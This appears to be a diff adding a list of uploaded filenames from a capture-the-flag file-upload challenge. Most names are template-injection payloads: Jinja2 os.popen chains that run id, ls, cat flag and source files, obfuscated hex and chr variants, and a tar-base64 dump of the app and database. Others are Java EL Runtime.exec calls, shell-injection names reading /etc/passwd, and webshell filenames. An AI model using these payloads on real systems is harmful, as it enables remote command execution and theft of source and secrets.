@@ -1,0 +1,161 @@
+app/uploads/malware
+app/uploads/flag.py
+app/uploads/not.png.img
+app/uploads/{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('ls').read() }}
+app/uploads/{{ ''.__class__.__mro__[1 }}
+app/uploads/exec.php
+app/uploads/{{'abc'.__class__.__base__.__subclasses__()[96].__subclasses__()[0].__subclasses__()[0]('test.txt').read()}}
+app/uploads/{{[].class.base.subclasses()}}
+app/uploads/{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('{{4*4}}')|attr('read')()}}
+app/uploads/{{cycler.__init__.__globals__.os.popen('python3 -c __import__\\(chr\\(111\\)+chr\\(115\\)\\).system\\(chr\\(108\\)+chr\\(108\\)+chr\\(32\\)+chr\\(47\\)+chr\\(97\\)+chr\\(112\\)+chr\\(112\\)+chr\\(47\\)+chr\\(97\\)+chr\\(112\\)+chr\\(112\\)+chr\\(47\\)\\)').read()}}
+app/uploads/{{ ''.__class__.__mro__[1].__subclasses__() }}
+app/uploads/1.sh
+app/uploads/{{ self.__init__.__globals__.__builtins__.__import__('os').popen('flag.txt').read() }}
+app/uploads/{{cycler.__init__.__globals__.os.popen(
+app/uploads/{{ dir() }}
+app/uploads/cat2.sh
+app/uploads/{{ [].__class__ }}
+app/uploads/{{config.__class__.__init__.__globals__['os'].popen('cat flag_0fdlc6.txt').read()}}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('python3 -c \\'__import__(`os)\\'').read() }}
+app/uploads/{{ module.system('id') }}
+app/uploads/n0t.png.jpg
+app/uploads/rce.php
+app/uploads/{{config.items()}}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('python3 --version').read() }}
+app/uploads/${T(java.lang.Runtime).getRuntime().exec('whoami')}
+app/uploads/'abc'.__class__.__base__.__subclasses__()[96].__subclasses__()[0].__subclasses__()[0]('flag.txt').read()
+app/uploads/{{ sys.version }}
+app/uploads/{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+app/uploads/{{''.__class__.__base__}}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('cat run.py').read() }}
+app/uploads/${{7*7}}
+app/uploads/7*7
+app/uploads/file.txt
+app/uploads/${3*3}
+app/uploads/{{7+7}}.txt
+app/uploads/{{ cycler.__init__.__globals__.os.popen('ls -la').read() }}
+app/uploads/photo.jpg
+app/uploads/'abc'.__class__.__base__.__subclasses__()].index(
+app/uploads/engine.render(
+app/uploads/{{ cycler.__init__.__globals__.os.popen('ls -l').read() }}
+app/uploads/{{'abc'.__class__.__base__.__subclasses__()[96].__subclasses__()[0]}}
+app/uploads/${1+1}
+app/uploads/YK_recupfile.py
+app/uploads/${class.getResource(
+app/uploads/{{ __import__('os').popen('cat etcpasswd').read() }}.txt
+app/uploads/file.enc
+app/uploads/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag_0fd1c6.txt').read() }}
+app/uploads/{{ self.__init__.__globals__ }}
+app/uploads/{{ config.items() }}
+app/uploads/{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+app/uploads/{{ self }}
+app/uploads/{{ '\\n'.join(self._TemplateReference__context.cycler.__init__.__globals__.os.listdir()) }}
+app/uploads/test.php.jpg
+app/uploads/ls.sh
+app/uploads/ex.php
+app/uploads/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+app/uploads/'abc'.__class__.__base__.__subclasses__()
+app/uploads/webshell.php
+app/uploads/{{ self.__init__.__globals__.__builtins__.__import__('os').system('ls') }}
+app/uploads/${class.getClassLoader()}
+app/uploads/{{cycler.__init__.__globals__.os.popen('python3 -c __import__\\(chr\\(111\\)+chr\\(115\\)\\).system\\(chr\\(108\\)+chr\\(115\\)+chr\\(32\\)+chr\\(47\\)+chr\\(97\\)+chr\\(112\\)+chr\\(112\\)+chr\\(47\\)+chr\\(97\\)+chr\\(112\\)+chr\\(112\\)+chr\\(47\\)\\)').read()}}
+app/uploads/yo.asp
+app/uploads/{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('echo  
+app/uploads/lel.sh
+app/uploads/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -la').read() }}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('cat flag_0fd1c6.txt').read() }}
+app/uploads/{{T(java.lang.Runtime).getRuntime().exec('whoami')}}
+app/uploads/{{''.__class__}}
+app/uploads/{{ lipsum.__globals__[
+app/uploads/{{ cycler.__init__.__globals__.os.popen('python3 -c \\'__import__\\'').read() }}
+app/uploads/test.pdf
+app/uploads/{{ [] }}
+app/uploads/{{ [].class.base.subclasses() }}
+app/uploads/{{cycler.__init__.__globals__.os.popen('python3 -c __import__\\(chr\\(111\\)+chr\\(115\\)\\).system\\(chr\\(108\\)+chr\\(115\\)+chr\\(32\\)+chr\\(47\\)+chr\\(97\\)+chr\\(112\\)+chr\\(112\\)+chr\\(47\\)+chr\\(97\\)+chr\\(112\\)+chr\\(112\\)\\)').read()}}
+app/uploads/c4t.sh
+app/uploads/{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[229](["ls
+app/uploads/{{''.__class__.mro()[1].__subclasses__()[396]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
+app/uploads/step2.py
+app/uploads/{{ ''.__class__.__mro__[1] }}
+app/uploads/debug.txt
+app/uploads/{{cycler.__init__.__globals__.os.popen('python3 -c print\\(0\\)').read()}}
+app/uploads/'
+app/uploads/{{ ().__class__ }}
+app/uploads/${T(java.lang.System).getenv()}
+app/uploads/abc.html
+app/uploads/{{4*4}}
+app/uploads/{{ls}}
+app/uploads/{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+app/uploads/{{2*2}}
+app/uploads/{{ self.__init__.__globals__.__builtins__.__import__('os').popen('flag_0fd1c6.txt').read() }}
+app/uploads/test.php
+app/uploads/{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+app/uploads/02.mp3";php -r '$sl=chr(47);$dot=chr(46);echo shell_exec("cat ${sl}etc${sl}passwd");';#
+app/uploads/mustang.png
+app/uploads/cat
+app/uploads/{{ self.__init__.__globals__ }}.txt
+app/uploads/{{ ''.__class__.__mro__[1].__subclasses__()[40] }}
+app/uploads/{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag*').read() }}
+app/uploads/";id;#
+app/uploads/{{'abc'.__class__.__base__.__subclasses__()}}
+app/uploads/{{ self.__init__.__globals__.__builtins__ }}
+app/uploads/{{cycler.__init__.__globals__.os.popen('python3 -c \\'__import__\\'').read()}}
+app/uploads/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
+app/uploads/{{'abc'.__class__.__base__.__subclasses__()[2]}}
+app/uploads/{{ 7 * 7 }}
+app/uploads/rce.php.jpg
+app/uploads/toto.php
+app/uploads/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}.txt
+app/uploads/{{ os }}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('cat app.py').read() }}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('id').read() }}
+app/uploads/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}.txt
+app/uploads/${T(java.lang.Runtime).getRuntime().exec('cat passwd')}
+app/uploads/flag
+app/uploads/{{cycler.__init__.__globals__.os.popen('python3 -c __import__\\(chr\\(111\\)+chr\\(115\\)\\).system\\(\\)').read()}}
+app/uploads/{{ __import__('os').popen('ls').read() }}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('ls ').read() }}
+app/uploads/{{cycler.__init__.__globals__.os.popen('python3 -c __import__\\(chr\\(111\\)+chr\\(115\\)\\).system\\(chr\\(108\\)+chr\\(115\\)+chr\\(32\\)+chr\\(47\\)+chr\\(97\\)+chr\\(112\\)+chr\\(112\\)\\)').read()}}
+app/uploads/lol.sh
+app/uploads/{{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('ls').read() }}.txt
+app/uploads/step2.html
+app/uploads/{{ cycler.__init__.__globals__.os.popen('touch test').read() }}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('python3').read() }}
+app/uploads/maybe.png
+app/uploads/{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag_0fd1c6.txt').read() }}
+app/uploads/02.mp3";id;#
+app/uploads/test.php.gif
+app/uploads/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag_0fd1c6.txt').read() }}.txt
+app/uploads/{{ cycler.__init__.__globals__.os.popen('cat config.py').read() }}
+app/uploads/screenshot.png
+app/uploads/{{config.__class__.__init__.__globals__['os'].popen('cat run.py').read()}}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('python3 -c 
+app/uploads/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('tar -cvJ requirements.txt test database.db app config.py run.py Dockerfile | base64').read() }}
+app/uploads/{{ ''.__class__ }}
+app/uploads/{{ __import__('os').popen('pwd').read() }}
+app/uploads/{{ config .__class__.__init__.__globals__[ 'os' ]. popen ( 'ls ' ). lire ()}}
+app/uploads/{{2_2}}
+app/uploads/{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}
+app/uploads/{{''.__class__.__base__.__subclasses__()}}
+app/uploads/{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('echo 
+app/uploads/{{ self.__init__.__globals__.__builtins__.__import__('os').system('id') }}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('cat app.app').read() }}
+app/uploads/catv.sh
+app/uploads/{{config.__class__.__init__.__globals__['os'].popen('cat flag_0fd1c6.txt').read()}}
+app/uploads/{{'abc'.__class__.__base__.__subclasses__()[96].__subclasses__()[0].__subclasses__()[0]}}
+app/uploads/README.license
+app/uploads/ssti
+app/uploads/{{'abc'.__class__.__base__.__subclasses__()[96]}}
+app/uploads/{{ cycler.__init__.__globals__.os.popen('strings database.db').read() }}
+app/uploads/{{ __import__('os').popen('ls').read() }}.txt
+app/uploads/{{ ', '.join(self._TemplateReference__context.cycler.__init__.__globals__.os.popen('tar -cvJ requirements.txt test database.db app config.py run.py Dockerfile | base64').read()) }}
+app/uploads/step1.py
+app/uploads/{T(java.lang.Runtime).getRuntime().exec('whoami')}
+app/uploads/{{ os.system('ls') }}
+app/uploads/{{ [].class.base.subclasses()}}
+app/uploads/word
+app/uploads/cat.sh
+app/uploads/{{ cycler.__init__.__globals__.os.popen('pwd').read() }}
+app/uploads/{{ ', '.join(self._TemplateReference__context.cycler.__init__.__globals__.os.listdir()) }}
+app/uploads/{{7*7}}
